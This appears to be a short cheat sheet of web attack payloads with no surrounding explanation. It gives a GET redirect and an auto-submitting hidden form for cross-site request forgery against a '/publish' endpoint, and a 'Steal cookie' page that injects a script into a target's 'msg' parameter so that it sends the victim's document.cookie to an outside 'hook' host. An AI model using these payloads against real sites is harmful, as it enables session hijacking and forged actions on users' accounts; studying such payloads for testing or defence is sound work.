### GET

```html
<script>
    window.location = "http://host/publish";
</script>
```

### POST

```html
<html>
  <body>
    <h1>Redirecting...</h1>
    <form 
      id="csrfForm" 
      action="http://host/publish" 
      method="POST"
    >
    </form>
    <script>
      document.getElementById("csrfForm").submit();
    </script>
  </body>
</html>
```

### Steal cookie

```html
<html>
  <body>
    <script>
      const payload = encodeURIComponent(
        '<script>var i=new Image();i.src="http://hook/?c="+encodeURIComponent(document.cookie);<\/script>'
      );
      window.location = 'http://target?msg=' + payload;
    </script>
  </body>
</html>
```
